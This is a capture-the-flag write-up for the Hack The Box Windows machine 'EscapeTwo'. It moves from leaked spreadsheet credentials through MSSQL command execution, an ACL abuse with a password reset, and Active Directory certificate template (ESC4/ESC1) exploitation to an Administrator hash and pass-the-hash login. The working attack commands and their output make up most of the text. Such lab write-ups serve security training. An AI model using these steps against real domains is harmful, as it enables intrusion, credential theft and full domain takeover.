---
title: EscapeTwo
layout: post
released: 2025-01-12
creators:
  - ruycr4ft
  - Llo0zy
pwned: true
tags:
  - os/windows
  - diff/easy
category:
  - HTB
description: Escape two is an assumed breach scenario where we start of as Rose. Rose is able to view an SMB share that contains excel files which contain additional credentials for SA. SA is a service account running mssql which we have access to xp_cmdline to get a foothold. With this foothold we can look around and find a file with a cleartext password which, when password spraying, leads us to Ryan's account. Ryan has an ACL to write owner the CA account, which is the Certificate Authority service. Using the CA service we find a vulnerable certificate template that needs a slight edit for the ESC to work. Once we edit and exploit the template we're able to grab the Administrator's certificates and just like that we have root!
image: https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png
cssclass: custom_htb
---
![Escape2](https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png)
# Nmap
Our port scan finds the following ports open:

```bash
$ nmap -p- --min-rate 10000 10.129.137.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 21:33 AEDT
Nmap scan report for 10.129.137.51
Host is up (0.38s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49689/tcp open  unknown
49694/tcp open  unknown
49716/tcp open  unknown
49735/tcp open  unknown
59896/tcp open  unknown
```

# Foothold

As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose` / `KxEPkKe6R8su`
Since SMB is running `445/tcp open microsoft-ds`, enumerating SMB shares:

```bash
$nxc smb sequel.htb -u Rose -p KxEPkKe6R8su --shares
SMB         10.129.137.51  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.137.51  445    DC01             [+] sequel.htb\Rose:KxEPkKe6R8su 
SMB         10.129.137.51  445    DC01             [*] Enumerated shares
SMB         10.129.137.51  445    DC01             Share           Permissions     Remark
SMB         10.129.137.51  445    DC01             -----           -----------     ------
SMB         10.129.137.51  445    DC01             Accounting Department READ            
SMB         10.129.137.51  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.137.51  445    DC01             C$                              Default share
SMB         10.129.137.51  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.137.51  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.137.51  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.137.51  445    DC01             Users           READ  
```

Rose has read access to `Accounting Department` share, enumerating the share we find:
- `accounting_2024.xlsx`
- `accounts.xlsx`

```bash
$smbclient '\\sequel.htb\Accounting Department' -U Rose%KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 20:52:21 2024
  ..                                  D        0  Sun Jun  9 20:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 20:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 20:52:07 2024

                6367231 blocks of size 4096. 929454 blocks available
```

File formats from microsoft office are all just zip files:

```bash
$file accounts.xlsx 
accounts.xlsx: Zip archive data, made by v2.0, extract using at least v2.0, last modified, last modified Sun, Jun 09 2024 10:47:44, uncompressed size 681, method=deflate
$file accounting_2024.xlsx 
accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate
```

## accounts.xlsx
contents of `accounts.xlsx`

```bash
$tree
.
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   ├── core.xml
│   └── custom.xml
├── _rels
└── xl
    ├── sharedStrings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    ├── workbook.xml
    └── worksheets
        ├── _rels
        │   └── sheet1.xml.rels
        └── sheet1.xml

7 directories, 10 files
```

### sharedStrings.xml

this file contained users and passwords:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

we find that account `sa` has a password of `MSSQLP@ssw0rd!`, using this to authenticate mssql:

```bash
$nxc mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth
MSSQL       10.129.137.51  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.137.51  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

# User
user `SA` running on the box as `sql_svc` has command execution

```bash
$nxc mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth -x whoami MSSQL       10.129.137.51  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.137.51  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!) MSSQL       10.129.137.51  1433   DC01             [+] Executed command via mssqlexec MSSQL       10.129.137.51  1433   DC01             sequel\sql_svc
```

Let's use this command execution to establish a shell using our reverse shell method of choice.

## Cleartext Credentials

Looking around we can find `Ryan`'s password `WqSZAF6CysDQbGb3` in `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`

```bash
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False"
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Ryan is part of the Remote Managers group so we can access the machine through WinRM

```bash
$evil-winrm -i sequel.htb -u ryan -p WqSZAF6CysDQbGb3
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Just like that we have User!

# Root
cheking for ryan's ACL permissions we find WriteOwner for `Certification Authority`:

```bash
$ Get-ADUser -Filter * | ForEach-Object {echo $_.Name-----;(Get-ACL "AD:\$_").Access | ? {$_.IdentityReference -like "*ryan*"}}
<SNIP>
Certification Authority
-----

ActiveDirectoryRights : WriteOwner
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : SEQUEL\ryan
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

> Note that the above command is one of many ways to do this, alternatives include but are not limited to: Bloodhound ,ldapsearch, dacledit.

we can change `ca_svc`'s password to: `w1ldP@ssword2022` by using the following process:

```bash
# Change `ryan` to become an owner of `ca_svc`
$impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
# edit DACL to give `ryan` full access control over `ca_svc
$impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
[*] DACL backed up to dacledit-20250112-234353.bak
[*] DACL modified successfully!
# change password
$net rpc password "ca_svc" "w1ldP@ssword2022" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "sequel.htb"
```

## ca_svc

`CA` stands for certificate authority, using certipy-ad to find vulnerable certificate templates:

```bash
$certipy-ad find -u 'ca_svc' -p w1ld@ssword2022 -dc-ip 10.129.137.51 -vulnerable -enabled
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250112235054_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250112235054_Certipy.txt'
[*] Saved JSON output to '20250112235054_Certipy.json'
```

Looking in `20250112235054_Certipy.json` we can check for vulnerabilities detected by `certipy`

```json
"Template Name": "DunderMifflinAuthentication"
<SNIP>
"[!] Vulnerabilities": {
     "ESC4": "'SEQUEL.HTB\\\\Cert Publishers' has dangerous permissions"
```

With this vulnerability I try exploiting ESC1, uploading the template is successful, however encounter a DNS error when requesting certificates:

```bash
$ certipy-ad req -u ca_svc -p w1ldP@ssword2022 -target sequel.htb -dns sequel.htb -ca sequel-dc01-ca -upn Administrator -template DunderMifflinAuthentication
[-] Got error while trying to request certificate: code: 0x8009480f - CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject Alternate name.
```

update the template to bypass the error:

```diff
 Certificate Name Flag               : SubjectRequireCommonName
-                                      SubjectAltRequireDns
```

Upload our template on the box (certipy is configured to make it vulnerable to ESC1 by default):

```bash
$ certipy-ad template -u ca_svc -p w1ldP@ssword2022 -template DunderMifflinAuthentication -save-old -dc-ip 10.129.137.51
```

after which we can request the certificate exploiting ESC1:

```bash
$certipy-ad req -u ca_svc -p w1ldP@ssword2022 -target sequel.htb -dns sequel.htb -ca sequel-dc01-ca -upn Administrator -template DunderMifflinAuthentication
```

and authenticate to gather hashes:

```bash
$certipy-ad auth -pfx administrator_sequel.pfx -username Administrator -domain sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator'
    [1] DNS Host Name: 'sequel.htb'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

## Administrator

using the hash I can login as the administrator!

```bash
$nxc winrm sequel.htb -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
WINRM       10.129.2.95     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.2.95     5985   DC01             [+] sequel.htb\Administrator:7a8d4e04986afa8ed4060f75e5a0b3ff (Pwn3d!)
```

Just like that we have root!